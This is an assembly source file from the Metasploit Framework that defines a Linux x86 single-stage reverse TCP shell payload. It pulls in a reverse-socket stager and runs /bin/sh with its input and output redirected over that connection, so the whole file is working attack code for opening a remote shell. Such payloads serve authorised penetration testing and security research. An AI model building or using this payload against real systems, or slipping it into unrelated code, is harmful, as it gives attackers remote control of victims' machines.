;;
; 
;        Name: single_reverse_tcp_shell
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Single reverse TCP shell.
;
;;
BITS   32

%include "generic.asm"

%define  USE_SINGLE_STAGE 1
%include "stager_sock_reverse.asm"

shell:
	execve_binsh EXECUTE_REDIRECT_IO
